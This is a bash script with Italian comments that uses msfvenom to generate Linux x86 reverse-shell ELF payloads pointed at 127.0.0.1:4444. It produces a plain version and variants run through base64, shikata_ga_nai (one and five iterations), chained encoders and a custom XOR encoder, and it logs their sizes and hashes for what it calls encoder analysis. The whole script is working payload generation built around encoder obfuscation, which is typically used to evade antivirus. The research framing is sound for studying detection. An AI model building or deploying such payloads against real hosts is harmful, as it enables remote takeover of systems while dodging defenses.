#!/bin/bash
# Generazione payload per analisi encoder

echo "🎯 GENERAZIONE PAYLOAD PER ANALISI"
echo "======================================="

# Configurazione
LHOST="127.0.0.1"
LPORT="4444"
OUTPUT_DIR="../payloads"
LOG_FILE="../results/generation_log.txt"

# Creazione directory
mkdir -p $OUTPUT_DIR
mkdir -p ../results

# Inizio logging
echo "=== LOG GENERAZIONE PAYLOAD ===" > $LOG_FILE
echo "Data: $(date)" >> $LOG_FILE
echo "Host: $(hostname)" >> $LOG_FILE
echo "=================================" >> $LOG_FILE

# Funzione per generare payload con logging
generate_payload() {
    local name=$1
    local cmd=$2
    local output_file="$OUTPUT_DIR/$name"
    
    echo "" >> $LOG_FILE
    echo "Generando: $name" | tee -a $LOG_FILE
    echo "Comando: $cmd" >> $LOG_FILE
    
    if eval $cmd; then
        echo "✅ Successo: $name" | tee -a $LOG_FILE
        # Verifica file generato
        if [ -f "$output_file" ]; then
            local size=$(stat -c%s "$output_file" 2>/dev/null || stat -f%z "$output_file")
            local hash=$(sha256sum "$output_file" | cut -d' ' -f1)
            echo "Dimensioni: $size bytes" >> $LOG_FILE
            echo "SHA256: $hash" >> $LOG_FILE
        else
            echo "❌ File non generato: $name" >> $LOG_FILE
        fi
    else
        echo "❌ Fallimento: $name" | tee -a $LOG_FILE
    fi
}

# Payload originale (riferimento)
echo ""
echo "📦 GENERAZIONE PAYLOAD BASE..."
generate_payload "original.elf" \
    "msfvenom -p linux/x86/shell_reverse_tcp LHOST=$LHOST LPORT=$LPORT -f elf -o $OUTPUT_DIR/original.elf 2>/dev/null"

# Encoder Base64
echo ""
echo "🔒 ENCODING BASE64..."
generate_payload "base64_encoded.elf" \
    "msfvenom -p linux/x86/shell_reverse_tcp LHOST=$LHOST LPORT=$LPORT -f elf -e x86/base64 -o $OUTPUT_DIR/base64_encoded.elf 2>/dev/null"

# Shikata Ga Nai - 1 iterazione
echo ""
echo "🔄 SHIKATA GA NAI (1 iterazione)..."
generate_payload "shikata_1.elf" \
    "msfvenom -p linux/x86/shell_reverse_tcp LHOST=$LHOST LPORT=$LPORT -f elf -e x86/shikata_ga_nai -i 1 -o $OUTPUT_DIR/shikata_1.elf 2>/dev/null"

# Shikata Ga Nai - 5 iterazioni
echo ""
echo "🔄 SHIKATA GA NAI (5 iterazioni)..."
generate_payload "shikata_5.elf" \
    "msfvenom -p linux/x86/shell_reverse_tcp LHOST=$LHOST LPORT=$LPORT -f elf -e x86/shikata_ga_nai -i 5 -o $OUTPUT_DIR/shikata_5.elf 2>/dev/null"

# Multi-encoder
echo ""
echo "🎭 MULTI-ENCODING..."
generate_payload "multi_encoded.elf" \
    "msfvenom -p linux/x86/shell_reverse_tcp LHOST=$LHOST LPORT=$LPORT -f elf -e x86/shikata_ga_nai -i 2 | msfvenom -e x86/alpha_upper -i 2 -f elf -o $OUTPUT_DIR/multi_encoded.elf 2>/dev/null"

# Encoder personalizzato XOR
echo ""
echo "🛠️ ENCODER PERSONALIZZATO XOR..."
if [ -f "$OUTPUT_DIR/original.elf" ]; then
    python3 custom_xor_encoder.py -i "$OUTPUT_DIR/original.elf" -o "$OUTPUT_DIR/xor_encoded.elf" -k 0xAA
    if [ $? -eq 0 ]; then
        echo "✅ Encoder personalizzato completato" | tee -a $LOG_FILE
    else
        echo "❌ Encoder personalizzato fallito" | tee -a $LOG_FILE
    fi
fi

# Analisi dimensioni finali
echo ""
echo "📊 ANALISI DIMENSIONI FINALI:"
echo "==============================" >> $LOG_FILE
echo "DIMENSIONI FINALI:" >> $LOG_FILE
echo "==============================" >> $LOG_FILE

for file in $OUTPUT_DIR/*.elf; do
    if [ -f "$file" ]; then
        size=$(stat -c%s "$file" 2>/dev/null || stat -f%z "$file")
        echo "$(basename $file): $size bytes" | tee -a $LOG_FILE
    fi
done

echo ""
echo "✅ GENERAZIONE COMPLETATA!"
echo "📁 Payload in: $OUTPUT_DIR"
echo "📄 Log in: $LOG_FILE"
echo ""
echo "🎯 Per analisi: python3 analysis_tool.py"
